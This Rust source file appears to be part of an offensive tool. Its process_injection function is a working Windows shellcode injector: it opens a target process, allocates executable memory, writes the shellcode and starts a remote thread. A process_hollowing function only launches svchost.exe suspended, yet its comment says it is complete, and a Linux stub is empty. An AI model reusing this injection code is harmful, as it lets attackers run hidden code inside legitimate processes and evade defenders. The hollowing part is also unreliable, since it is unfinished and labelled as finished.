use std::ptr;

#[cfg(target_os = "windows")]
use windows::Win32::System::Diagnostics::Debug;
use windows::Win32::System::Memory;
use windows::Win32::System::Threading;

#[cfg(target_os = "windows")]
pub fn process_injection(pid: u32, shellcode: [u8; 255]) -> Result<(), Box<dyn std::error::Error>> {
    // Initializes a process
    let process_handle =
        unsafe { Threading::OpenProcess(Threading::PROCESS_ALL_ACCESS, false, pid) }?;

    // Allocates Memory Space
    let remote_buffer = unsafe {
        Memory::VirtualAllocEx(
            process_handle,
            None,
            shellcode.len(),
            Memory::MEM_RESERVE | Memory::MEM_COMMIT,
            Memory::PAGE_EXECUTE_READWRITE,
        )
    };

    // Writes to buffer
    unsafe {
        Debug::WriteProcessMemory(
            process_handle,
            remote_buffer,
            shellcode.as_ptr() as *const std::ffi::c_void,
            shellcode.len(),
            None,
        )
    }?;

    let _remote_thread = unsafe {
        Threading::CreateRemoteThread(
            process_handle,
            None,
            0,
            std::mem::transmute(remote_buffer),
            None,
            0,
            None,
        )
    }?;

    Ok(())
}

#[cfg(target_os = "linux")]
pub fn process_injection(pid: &str) {}

#[cfg(target_os = "windows")]
pub fn process_hollowing(_shellcode: [u8; 255]) -> Result<(), Box<dyn std::error::Error>> {
    use windows::{
        core::{PCSTR, PSTR},
        Win32::System::Threading::{PROCESS_INFORMATION, STARTUPINFOA},
    };

    unsafe {
        let target_si: STARTUPINFOA = STARTUPINFOA::default();
        let mut target_pi: PROCESS_INFORMATION = PROCESS_INFORMATION::default();

        Threading::CreateProcessA(
            PCSTR("C:\\\\Windows\\\\System32\\\\svchost.exe".as_ptr()),
            PSTR(ptr::null_mut()),
            None,
            None,
            true,
            Threading::CREATE_SUSPENDED,
            None,
            PCSTR(ptr::null_mut()),
            &target_si as *const STARTUPINFOA,
            &mut target_pi as *mut PROCESS_INFORMATION,
        )
    }?;

    // Successfully completed operation
    Ok(())
}
